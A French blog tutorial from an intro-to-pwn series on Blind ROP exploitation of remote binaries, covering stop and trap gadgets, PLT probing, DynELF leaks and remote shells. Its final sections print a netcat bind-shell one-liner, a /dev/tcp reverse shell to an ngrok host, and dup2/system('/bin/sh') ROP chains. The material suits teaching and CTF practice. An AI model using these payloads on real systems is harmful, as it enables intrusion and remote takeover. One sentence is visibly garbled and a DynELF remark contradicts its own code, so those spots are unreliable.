---
title: Partie 24 - Exploiter un binaire par ROP - BROP – exploitation en boîte noire (5/6)
date: 2026-04-15 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Exploiter un binaire par ROP : BROP – exploitation en boîte noire (5/6)

Le meilleur pour la fin ! Attaquons ce gros morceau qu'est le **BROP** alias **Blind ROP** ou **ROP "à l'aveugle"**.

Pour faire court, le **BROP** c'est faire du **ROP** sur un programme dont on ne possède pas le binaire.  Et là, la question que l'on se pose rapidement est : **comment trouver des gadgets dans un programme auquel on n’a pas accès ?**

C'est là que réside la difficulté de l'exploitation, une difficulté à laquelle le **BROP** apporte une solution. Nous allons dans un premier temps nous intéresser au **BROP 64 bits** avant de voir comment le mettre en place en **32 bits** (sans vouloir vous divulgâcher, c'est la **même méthodologie** 🙃). 

Nous profiterons également de l'occasion pour comprendre comment **ouvrir et interagir** avec un terminal **ouvert à distance**. 

Voici les principales étapes que nous étudierons dans ce chapitre :

1. le gadget `stop` ;
2. trouver des gadgets intéressants ;
3. faire fuiter le programme et/ou la libc ;
4. communiquer avec un terminal à distance ;
5. chaîne de ROP finale.

> Comme pour le **SROP** et le **JOP** nous n'allons pas exploiter, lors de ce chapitre, de challenge qui nécessite la mise en place d'une telle technique. Néanmoins, nous allons voir en détail comment le **BROP** fonctionne en mettant notamment l'accent sur **les étapes les plus complexes**.
> 
> Il se peut que certaines étapes soient à rafistoler et adapter en fonction du programme à exploiter et du contexte d'exploitation.
{: .prompt-tip }

## Fonctionnement global

> Il existe [un article](https://www.scs.stanford.edu/~sorbo/brop/bittau-brop.pdf) technique en anglais qui détaille les différentes étapes du **BROP**. 
{: .prompt-tip }

Avant de rentrer plus en détail dans la mise en place du **BROP**, comprenons d'abord comment cette technique est censée nous permettre d'exploiter un programme sans disposer de son code source.

Commençons avec les hypothèses suivantes :

- il est possible de **communiquer** avec le programme distant ;
- une vulnérabilité de type *buffer overflow* **sur la pile** est présente ;
- il est possible d'envoyer un grand nombre de requêtes au programme sans être banni ;
- il est possible de savoir (ou deviner) quand le programme **plante** ou non ;
- le processus avec lequel nous communiquons est lancé via un `fork` (pour les programmes compilés avec des canaris).

L'idée générale va être d'utiliser une technique d'[essai-erreur](https://fr.wikipedia.org/wiki/M%C3%A9thode_essai-erreur), en envoyant **diverses requêtes**, pour comprendre comment fonctionne le programme et **trouver les gadgets** dont nous avons besoin pour l'exploiter.

Imaginez jouer à un **jeu Mario** avec **l’écran éteint** avec pour objectif de **finir le niveau**. Au départ on **ne connaît pas** la carte. En revanche, on reçoit des **indices** (les sons, les vibrations de la manette ...) au fur et à mesure que l'on y joue. En multipliant les essais et en observant ces retours, on finit par reconstituer progressivement les principaux éléments du niveau. Une fois ces éléments identifiés, il ne reste plus qu’à enchaîner les bonnes touches pour terminer le niveau.

![](/assets/images/introduction_au_pwn/super-mario-successfully-finished-hard-level-y7eegnfcoal9uw7m.webp)

Avec le **BROP**, c'est exactement la même stratégie. Pour reprendre l'analogie, ce qui va nous permettre d'avancer, c'est le fait **de modifier l'adresse de retour** pour se déplacer vers différents endroits dans le programme. Quant à ce qui va nous permettre de déterminer si nous avons trouvé quelque chose d’intéressant ou non, c'est ce que **retourne le programme** en termes de chaînes de caractères ou de comportement.

Évidemment, trouver les gadgets n'est pas la seule étape lors de l'exploitation. Généralement, les premières étapes seront les suivantes :

- **si le programme est compilé avec les canaris** : [le faire fuiter](/posts/introduction_au_pwn_partie_12/) ;
- **si le programme est PIE** : déterminer les octets de poids fort de l'adresse de retour.

Une fois que ces premières étapes sont réalisées, nous allons devoir trouver deux autres gadgets qui sont très importants dans le cadre de la mise en place du **BROP** :

- le **gadget** `stop` : il s'agit d'un gadget qui, une fois exécuté, affiche un comportement (chaîne de caractères précise affichée, programme mis en pause quelques secondes ...) qui nous permettra de trouver facilement d'autres gadgets. Nous nous pencherons sur son utilité juste après ;
- le **gadget** `trap` : une adresse qui fait planter le programme à coup sûr (zone mémoire non exécutable, adresse invalide etc.). Généralement facile à trouver.

Il est important de **prendre le temps de trouver le** `stop` **gadget** car c'est ce qui va nous permettre de trouver les autres gadgets en tâtonnant. Pour ce qui est du gadget `trap`, une adresse invalide telle que `0xdeadbeefcafebabe` fera l'affaire.

## 1️⃣ Le gadget `stop`

> J'ai absolument rien compris à ce que c'est ni comment le trouver 🤨 ?
{: .prompt-info }

Un _stop gadget_ est une adresse qui, lorsqu’elle est exécutée, produit un comportement **stable, reconnaissable** et qui **ne fait pas planter** le programme, permettant de distinguer une **exécution valide** d’un **crash**. Il nous permettra de **valider certains gadgets** lors de notre recherche. 

Essayons de comprendre le rôle du gadget `stop` à travers ce programme (qui n'a ni queue ni tête honnêtement):

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// gcc -no-pie -fno-pie -fno-stack-protector main.c -o exe

int main(int argc, char *argv[]) 
{
    if (argc < 2) 
    {
        puts("Usage: ./exe <taille>");
        return 1;
    }
    int taille = atoi(argv[1]);
    char buffer[0x10] = {0};
    
    for (int i = 0; i < taille; i++) 
    {
        if (read(0, &buffer[i], 1) <= 0) 
        {
            puts("Une erreur s'est produite");
            break;
        }
        if (strlen(buffer) > 0x10) 
        {
            puts("Hop hop hop !");
        }
    }
    
    if(strlen(buffer) % 2 == 0)
        puts("Pair");
    else
        puts("Impair");
        
    return 0;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-rop-brop.zip](https://drive.proton.me/urls/TW0G3820PC#xd8fUhSgp6tG)
- 🔎 **SHA256 & Analyse Virus Total** : [3651eddb602442a1fb31f60e96e72acff4664515006d3967bf32976753ec1c05](https://www.virustotal.com/gui/file/3651eddb602442a1fb31f60e96e72acff4664515006d3967bf32976753ec1c05)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-rop-brop .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-rop-brop
```

Le dépassement mémoire sur la pile, on l'a tous vu 🧐. Mais nous, ce que l'on veut, c'est comprendre ce qu'est un `stop` gadget et comment le trouver.

Comme vous pouvez le constater il y a plusieurs appels à `puts` dont nous pouvons utiliser la *string* affichée pour comprendre de plus en plus le fonctionnement du programme. Elles peuvent toutes être, *a priori*, de bonnes cibles pour le `stop` gadget. Sauf que l'une d'elles est **bien plus pertinente** que les autres, à savoir `"Usage: ./exe <taille>"`.

> Et pourquoi donc ?
{: .prompt-info }

Les autres sont placées dans des boucles ou peuvent être affichées sous certaines conditions qui sont liées à la saisie utilisateur. De plus `"Usage: ./exe <taille>"` ne devrait jamais être affichée dans un usage normal du programme.

L'appel à `puts` pour cette *string* est situé ici:

```nasm
  4011a2:       89 7d dc                mov    DWORD PTR [rbp-0x24],edi
  4011a5:       48 89 75 d0             mov    QWORD PTR [rbp-0x30],rsi
  4011a9:       83 7d dc 01             cmp    DWORD PTR [rbp-0x24],0x1
  4011ad:       7f 14                   jg     4011c3 <main+0x2d>
  4011af:       bf 04 20 40 00          mov    edi,0x402004 ; "Usage: ./exe <taille>"
  4011b4:       e8 b7 fe ff ff          call   401070 <puts@plt>
```

Par conséquent, nous pourrons utiliser l'adresse `0x4011af` en tant que `stop` gadget.

> Mais on est pas censé ne pas connaître le programme à l'avance ?
{: .prompt-info }

Oui justement, le gadget `stop`, il faut **le chercher** ! On pourra notamment modifier les **octets de poids faible** de l'adresse de retour pour le trouver. Généralement, c'est en **tâtonnant** que l'on arrive petit à petit à comprendre où l'on se situe et ce que l'on est grosso modo en train d'exécuter.

Par ailleurs, le gadget `stop` doit permettre de "quitter" le programme distant, sans le faire planter, ainsi que les boucles qu'il contient et qui peuvent poser problème dans notre recherche de gadgets.

Une difficulté qu'il peut y avoir dans la recherche du `stop` gadget est qu'il peut y avoir plusieurs candidats dont certains qui vont s'avérer être des faux positifs. N'hésitez pas à en sélectionner plusieurs, notamment ceux qui semblent avoir un comportement différent des autres.

Dans le précédent exemple, que l'on utilise `0x4011a5`, `0x4011ad` ou `0x4011af`, le comportement du programme est le même : il a des chances d'afficher `"Usage: ./exe <taille>"`.

> Le gadget `stop` doit retourner autre chose que ce que le programme retourne lorsqu'il termine correctement son exécution. Par exemple si le programme affiche `"Au revoir !"` et que le gadget `stop` également, on va pas aller bien loin 😅.
{: .prompt-tip }

### Et le gadget `trap` alors ?

Comme nous l'avons vu plus haut, le gadget `trap` est une **adresse invalide**, de telle sorte à ce que l'on sache que, si le programme saute à cet adresse, il va **planter à coup sûr**. Voici comment peuvent être utilisés les gadgets `stop` et `trap` :

![](/assets/images/introduction_au_pwn/stop_trap_gadget.png)

Dans le schéma ci-dessus, le gadget `stop` **met le programme en pause** pendant 10 secondes. Le gadget `trap`, quant à lui, est une **adresse invalide**, en l'occurrence `NULL`.

Le gadget `probe` (ou gadget sondé) est celui que l'on teste afin de déterminer s'il est de la forme voulue ou non. Par exemple, il peut s'agir d'un gadget `pop rax ; ret`, `xor eax, eax ; ret` ou autre.

Le fait de mettre en tête de pile les gadgets dans l'ordre `[probe][trap][stop]` permet de voir si le gadget `probe` est de type `pop r.. ; ret`. En effet, le cas échéant, le programme plante et n'exécute pas le gadget `stop`.

> Il peut y avoir des **faux positifs** comme le cas d'un gadget `add rsp, 8 ; ret` que l'on croirait être un `pop r.. ; ret` alors qu'il exécutera bien le gadget `stop`.
> 
> Avec le BROP, les faux positifs peuvent rapidement donner envie de s'arracher les cheveux 😅.
{: .prompt-warning }

En utilisant la même logique il est possible de trouver les gadgets de cette forme :

- `pop r.. ; pop r.. ; ret` avec `[probe][trap][trap][stop]` ;
- `pop r.. ; pop r.. ; pop r.. ; ret` avec `[probe][trap][trap][trap][stop]`.

Comme nous ne savons pas quelles sont les instructions exécutées, nous **ne pouvons pas distinguer**, pour l'instant, un `pop rdi ; ret`, `pop rsi ; ret` d'un `pop r12 ; ret`. Nous verrons plus loin comment faire.

L’objectif est de contrôler `rdi`, `rsi` et `rdx` afin de pouvoir **appeler des fonctions** intéressantes en **contrôlant leurs arguments**. 

## 2️⃣ Trouver des gadgets intéressants

Il existe une astuce pour ne pas avoir à se demander si nous avons trouvé un `pop rdi ; ret`ou un `pop rsi ; ret` : 

![](/assets/images/introduction_au_pwn/le_brop_gadget.png)

Ce qui est communément appelé **BROP gadget** ... c'est un gadget que vous connaissez déjà :

![](/assets/images/introduction_au_pwn/brop_gadget.png)

Cela ne vous rappelle rien 😏 ?

> C'est le fameux gadget de la fonction `__libc_csu_init` ?
{: .prompt-info }

Oui ! Comment pouvons-nous l'oublier ! Ce que l'on peut faire lors de notre recherche de gadget est la chose suivante :

1. utiliser un dépassement mémoire de cette forme :  `[probe][trap]*6[stop]` ;
2. si le gadget stop est bien exécuté, tester : `[probe+7][trap]*2[stop]` ;
3. si le gadget stop est encore bien exécuté, tester : `[probe+9][trap][stop]` ;
4. si le gadget stop est bien exécuté, alors il y a de grandes chances que l'adresse `probe` corresponde au **BROP gadget** 😎.

En ayant trouvé le BROP gadget nous savons comment charger `rdi` et `rsi`.

### Contrôler `rdx`

Vous vous doutez bien que s'il fallait seulement contrôler `rdi` et `rsi`, ce serait trop facile ! Nous avons généralement besoin de `rdx`. Pour cela il existe plusieurs solutions. Les plus simples ou accessibles sont les suivantes :

1. réussir à faire fuiter une adresse de la pile afin de faire un `ret2csu` en faisant en sorte que `call [r12 + rbx*8]` soit un appel valide (en le faisant pointer vers une adresse de la pile que l'on contrôle) ;
2. trouver où une fonction `write` ou `send` est appelée ;
3. chercher la **PLT** par force brute en essayant de trouver un `send`/`write` tout en espérant que `rdx` ne soit ni nul ni n'ait une trop grande valeur.

La première solution est intéressante dans le cas où il est facile d'avoir une fuite d'une adresse de la pile. La deuxième est peut-être encore plus accessible dans le sens où il y a moins d'hypothèses à prendre en compte.

> Bah oui mais que ce soit `send` ou `write`, le troisième argument de ces fonctions est le nombre d'octets à envoyer or on ne contrôle pas encore `rdx` 🧐.
{: .prompt-info }

On ne contrôle pas `rdx`, certes. C'est pour cela que nous allons tâtonner pour trouver une suite d'instruction de ce type :

```nasm
mov rdi, xxx
mov rsi, xxx
mov rdx, 0x100
call write
```

En utilisant le **BROP gadget** nous pouvons choisir arbitrairement `rdi` et `rsi`. Il ne nous restera plus qu'à faire fuiter le programme pour y trouver des fonctions intéressantes et pourquoi pas un gadget `pop rdx ; ... ; ret`, on a le droit de rêver non 🙃 ?

Si cela n'aboutit à rien d'intéressant, nous pourrons **basculer notre recherche de gadget** dans la **libc** en l'ayant préalablement fait fuiter.

> Dans l'[article](https://www.scs.stanford.edu/~sorbo/brop/bittau-brop.pdf) qui détaille comment mettre en place le **BROP**, ils expliquent comment charger `rdx` en navigant dans la PLT afin de trouver une fonction `strcmp` et utiliser un effet de bord permettant.
> 
> Le souci de cette technique est qu'il n'y a pas toujours de fonction `strcmp` utilisée et que cet effet de bord n'est pas systématique (dépend de la version utilisée de la **libc** ?).
{: .prompt-tip }

### Naviguer dans la PLT

Si la tentative de _leak_ n’a pas abouti, il nous reste encore une option : **trouver la table PLT** et **tenter d’identifier les fonctions qu’elle référence**.


![](/assets/images/introduction_au_pwn/plt_got_schema.png)

Dans les programme 64 bits, chaque entrée de la **PLT** fait 16 octets. Ainsi, nous allons pouvoir réaliser une recherche plus rapide en cherchant `0x10` octets par `0x10` octets. La **PLT** se trouve généralement au **début du programme**.

> On est censé mettre quels arguments si on trouve la **PLT** pour ne pas que cela plante ?
{: .prompt-info }

La réponse est : ça dépend. En fait, beaucoup de fonctions de la **libc** sont en réalité des **surcouches d'appels système**. Ce détail a son importance car cela signifie que si les arguments ne sont pas valides lors de l'appel d'une fonction qui fait directement appel à un appel système, cela ne va pas faire planter le programme en *user land*.

Bien sûr, rien ne nous interdit de mettre des **valeurs pertinentes** dans `rdi` et `rsi`. Peut-être que cela permettra de **faire fuiter des données** situées à l'adresse pointée par `rsi`ou `rdi`. Auquel cas nous avons peut-être trouvé une manière de faire fuiter le programme et on pourra appliquer la méthode précédente pour **récupérer le programme voire la libc**.

Ainsi un *payload* permettant de trouver une entrée de la **PLT** pourrait avoir la forme suivante : `[pop_rsi_r15][val_rsi][osef][pop_rdi][val_rdi][probe+0x10*i][stop]`.

Encore une fois, c'est entre autre grâce à l'exécution du gadget `stop` que l'on saura si nous sommes bien sur une entrée de la **PLT** (ou un gadget) qui ne fait pas planter le programme.

> N'hésitez pas à bidouiller le *payload* à votre guise. En fonction du programme exploité, **les comportements peuvent varier** et on ne pourra pas appliquer chaque étape du **BROP** de la même manière pour tous les programmes.
> 
> Par exemple, faites attention aux données que vous renvoie le programme à chaque tentative. Si vous y trouvez des octets qui ne sont généralement pas retournés, vous avez peut-être trouvé un gadget ou une fonction intéressante. 
{: .prompt-tip }

## 3️⃣ Faire fuiter le programme et/ou la libc

A ce stade, nous allons supposer que nous avons pu trouver une primitive de lecture permettant de **faire fuiter** `N` **octets à une adresse donnée**. Le supplice a assez duré, il est temps de récupérer le programme, voire la **libc** si possible, afin de l'analyser localement. 

Pour cela il existe différentes solutions :

1. récupérer petit à petit le programme en faisant fuiter les données à partir de l'adresse de base du programme ;
2. utiliser le module [DynELF](https://docs.pwntools.com/en/stable/dynelf.html) de **pwntools**.

La **première solution** permet de récupérer totalement le programme ainsi que la **libc** une fois que l'on aura déterminé leur adresse de base. Néanmoins elle peut être un peu plus fastidieuse.

En revanche, la **seconde méthode** permet de trouver des symboles, en l'occurrence des fonctions, sans avoir à télécharger les deux binaires. C'est l'occasion d'apprendre à utiliser le module **DynELF** qui peut s'avérer très utile !

### Utiliser DynELF

Notre ami **DynELF** n'est pas très demandeur, il n'a besoin qu'on lui fournisse seulement une fonction python qui **lit au moins 1 octet à une adresse donnée** ainsi qu'une **adresse du programme** dont on a une primitive de lecture arbitraire. Ensuite, c'est lui qui se charge du reste 🦾.

Le module s'utilise ainsi :

```python
def leak(addr):
    # (...)
        
d = DynELF(leak, addr_prgrm)  

system = d.lookup("system", "libc")
execve = d.lookup("execve", "libc")
# (...)
```

où :
- `leak` est une fonction qui retourne au moins un octet lu à l'adresse donnée en paramètre ;
- `addr_prgrm` : une adresse présente dans le programme.

Avec ce script, les fonctions `system` et `memset` seront trouvées par le module **DynELF** sans que l'on ait besoin de le faire nous même. 

## 4️⃣ Communiquer avec un terminal à distance

A présent nous avons :

- des gadgets nous permettant de charger arbitrairement `rdi`, `rsi` et `rdx` ;
- accès à toutes les fonctions intéressantes de la **libc**.

Il ne nous reste plus qu'à mettre en place **la chaîne de ROP finale** en vue d'obtenir un terminal à distance. Et là, plusieurs cas peuvent se présenter :

1. soit il est possible de directement contrôler `stdin` et `stdout` à distance ➡️ c'est le cas le plus simple, **il n'y a rien de plus à faire** pour pouvoir contrôler la saisie du terminal qui sera ouvert à distance ;
2. soit le programme lit les données que l'on envoie depuis une *socket* qui n'est pas directement connectée à `stdin` et `stdout` ➡️ il va falloir faire ce "branchement" **nous-mêmes**.

Nous supposerons que nous sommes dans le **second cas** afin de découvrir l'usage de la fonction `dup2` qui est très utilisée pour avoir accès à `stdin` et `stdout`. Nous verrons également deux autres techniques très utilisées dans l'exploitation de programme à distance :

- 👂 **Bind shell :** programme (ou bout de code) qui **écoute** sur un port et **attend** que quelqu'un s'y connecte pour lui donner accès à un terminal.
- 📲 **Reverse shell :** programme (ou bout de code) qui **se connecte** à une adresse IP (et port) en lui **donnant** accès à un terminal.

### Les descripteurs de fichiers

Nous n'allons pas faire un cours de programmation réseau pour comprendre comment un programme traite des données provenant d'une connexion TCP. En revanche, il est utile de rappeler brièvement comment un programme **lit et écrit des données via un descripteur de fichier**.

Pour faire simple, un **descripteur de fichier** (ou *fd* pour *file descriptor*) est un **nombre** qui **identifie un fichier ouvert** dans le processus. Pour rappel, tout est fichier dans Linux, même les connexions réseau (ou *sockets*). Cela permet d'avoir une vue "haut niveau" d'un fichier en *user land*.

Les **trois premiers** sont généralement réservés aux flux standards suivants :

| Descripteur | Flux standard |
| ----------- | ------------- |
| 0           | `stdin`       |
| 1           | `stdout`      |
| 2           | `stderr`      |

A chaque fois qu'un **fichier sera ouvert** la valeur du prochain descripteur sera **incrémentée de 1**. Ainsi le `fd` de notre `socket` peut valoir `3`, `4` ou `5` etc. En somme, le dernier descripteur de fichier non utilisé sera retourné.

### Utiliser `dup2`

`dup2` est une fonction de la **libc** (et également un appel système) qui permet de **dupliquer un descripteur de fichier**. D'après son manuel, cette fonction prend deux arguments `dup2(int oldfd, int newfd)` :

- `oldfd` ➡️ ancien descripteur de fichier qui sera désormais référé par `newfd`. `oldfd` doit être un **descripteur de fichier valide** ;
- `newfd` ➡️ le nouveau descripteur de fichier qui se réfère désormais à `oldfd`. Si ce descripteur de fichier correspond à un fichier actuellement ouvert, ce dernier est fermé.

> Les termes `oldfd` et `newfd` peuvent prêter à confusion ...
{: .prompt-warning }

Je sais que vous vous posez la quess un programme dont on ntion : oui c'est du charabia et on comprend absolument pas qui se réfère à quoi, à partir de quand.

Prenons un **cas concret** pour comprendre : imaginons que notre **socket** ait pour descripteur de fichier la valeur `N`. En exécutant :

```cpp
dup2(N,0); // socket <-> stdin
dup2(N,1); // socket <-> stdout
```

Tout ce qui est **écrit ou lu dans** `stdin` et `stdout` sera à présent **écrit ou lu dans notre** `socket`. Ces deux lignes peuvent être interprétées ainsi :

- tout ce qui sera lu ou écrit depuis le `fd == 0`, tu le liras/écriras en réalité depuis `fd == N` ;
- tout ce qui sera lu ou écrit depuis le `fd == 1`, tu le liras/écriras en réalité depuis `fd == N` ;

Etant donné que le terminal distant lit et écrit depuis `stdin` et `stdout`, après l'appel à `dup2`, il lira et écrira les données via notre *socket*. C'est justement ce que l'on souhaite faire !

Voici **l'état des descripteurs de fichiers** une fois le terminal distant ouvert **avant** l'exécution de deux appels à `dup2`:

![](/assets/images/introduction_au_pwn/avant_dup2.png)

Après les deux appels à `dup2` :

![](/assets/images/introduction_au_pwn/apres_dup2.png)

En gros, on branche `stdin` et `stdout` à notre `socket`. Tout simplement.

> Et on la trouve comment la valeur `fd` de notre *socket* ?  
{: .prompt-info }

En tâtonnant 🙃. On teste à partir du premier descripteur non réservé (`3`) et on vérifie l’hypothèse ; si c’est le bon, on peut alors lire et écrire sur le terminal distant.

> S'il y a assez de place lors du dépassement de mémoire, il est également possible d'appeler `dup2(N, stderr)`.
{: .prompt-tip }

En ayant **dupliqué** les descripteurs de fichiers standards **vers celui de notre connexion**, nous pourrons directement interagir avec le terminal `/bin/sh` que nous ouvrirons lors de l'exploitation du programme à distance.

### Utiliser un bind shell

S'il n'est pas possible d'utiliser `dup2`, ou que vous avez la flemme de le faire, il est possible d'ouvrir un *shell* à distance qui restera à l'écoute sur un port donné avec la commande suivante ([source](https://yolospacehacker.com/fr/toolbox.php?id=ncbindnoe)) avec `system` ou `execve` par exemple :

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
```

> Ici le port utilisé est `4444` mais il est évidemment possible de le changer.
{: .prompt-tip }

Ensuite depuis votre machine : 

```sh
nc adresse_distante port
```

 Et vous aurez accès au terminal sans avoir à bidouiller les **descripteurs de fichiers**. Les deux seuls inconvénients de cette technique sont :

1. `netcat` doit être installé sur la machine distante ;
2. la commande à exécuter est assez longue et risque de consommer pas mal de place dans la chaîne de ROP.

### Utiliser un reverse shell

> Et si `netcat` n'est pas installé à distance ?
{: .prompt-info }

Eh bien on utilise un *reverse shell* ! Contrairement au **bind shell** où **nous nous connectons** à la machine exploitée, le **reverse shell** fait en sorte que **le programme se connecte** à notre machine.

Dans le cas où vous disposez d'une machine, raspberry pi ou autre dont vous pouvez ouvrir un port (ex : `1337`), cette technique sera plus simple à mettre en place.

> En ouvrant un port dans votre réseau local via votre box, vous le rendez vulnérable.
{: .prompt-warning }

Autrement, si vous ne souhaitez pas ouvrir de port dans votre réseau local ou que vous n'avez pas de machine où vous pouvez le faire, il est possible d'utiliser [ngrok](https://ngrok.com/download/linux).

**ngrok** est un outil qui permet de réaliser des tunnels réseau vers sa machine sans avoir à ouvrir de port, configurer un routeur etc.

En lançant `ngrok tcp 1337` vous aurez une sortie qui devrait ressembler à :

```
tcp://6.tcp.eu.ngrok.io:XXXXX -> localhost:1337
```

Notez bien le port `XXXXX` affiché, nous en aurons besoin pour la suite. Ensuite, avant d'envoyer l'exploit final, exécutez `nc -lvnp 1337` dans un onglet du terminal afin que votre machine soit en écoute sur le port `1337`.

Enfin, faites en sorte de lancer via la chaîne de ROP, au lieu de `execve("/bin/sh",...)` :

```cpp
execve("/bin/bash",{"/bin/bash","-c","/bin/bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/XXXXX 0>&1",NULL},NULL)
```

Ainsi, lorsque la machine distante exécutera cette commande, elle se connectera à **ngrok** qui transfèrera la connexion vers notre port `1337`, et nous aurons accès au *shell* !

## 🏁 Chaîne de ROP finale

La chaîne de ROP va dépendre de la manière dont on souhaite ouvrir le terminal.

1️⃣ En dupliquant les descripteurs de fichiers avec `dup2` :

```cpp
dup2(N,0);
dup2(N,1);
system("/bin/sh");
```

2️⃣ En utilisant un **bind shell** :

```cpp
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f");
```

3️⃣ En utilisant un **reverse shell** :

```cpp
system("/bin/bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/XXXXX 0>&1");
```

> Si `system` supprime certains privilèges dont vous avez besoin pour exploiter pleinement le programme, il sera possible de remplacer l'appel à `system` par : `execve("/bin/sh", {"/bin/sh", "-p" , "-c",..., NULL}, NULL)`.
{: .prompt-tip }

Et voilà ! Si la chaîne de ROP s'exécute sans soucis, vous devriez avoir accès à **un terminal à distance** 😎.

## Et en 32 bits alors ?

Exploiter un programme avec du BROP 32 bits est **plus facile**, dans le cas où la **libc** est accessible. Etant donné que les arguments sont passés directement **via la pile**, on s'embête moins avec des gadgets à chercher.

En revanche, dans le cas où il n'y a **pas de libc** ou qu'il est compliqué d'y accéder dans le cadre de l'exploitation, il est possible d'envisager une résolution via **des appels système**. Auquel cas, il faudra trouver des gadgets pour remplir les principaux registres utilisés pour les appels système.

Autrement, la **méthodologie d'exploitation est la même**.

## ✍️ Passer à la pratique

Vous trouverez, parmi les différents challenges de *pwn* du site [Hackropole](https://hackropole.fr/fr/pwn/), un challenge à résoudre avec du BROP : [Blind Date](https://hackropole.fr/fr/challenges/pwn/fcsc2021-pwn-blind-date/).

## 📋 Synthèse

![](/assets/images/introduction_au_pwn/cat_keyboard.png)

Bon, c'était long mais on a pu comprendre comment le BROP peut être mis en place. N'hésitez pas à adapter cette méthodologie en fonction du programme à exploiter.

Très souvent, on perd du temps car on se base sur des hypothèses qui se révèlent être fausses, par exemple :

- le programme est PIE, alors qu'en fait il ne l'est pas ;
- juste derrière le canari se trouvent `ebp` (sauvegardé) et l'adresse de retour, alors qu'il y a peut-être d'autres registres sauvegardés ;
- on a trouvé le `stop` gadget, alors qu'en fait il s'agit d'un faux positif.

En pratique, il faut prévoir une marge d’erreur pour éviter de rester bloqué sur des hypothèses incorrectes.

Nous avons pu apprendre, à travers le BROP, comment utiliser **DynELF** pour **faire fuiter les adresses de fonctions intéressantes** de la **libc** sans avoir à se préoccuper de la faire fuiter entièrement.

Également, nous avons vu plusieurs méthodes qui permettent de prendre le contrôle, à distance, d'un terminal via :

- la **duplication des descripteurs de fichier** ;
- un **bind shell**, auquel on se connecte ;
- un **reverse shell**, qui se connecte à nous.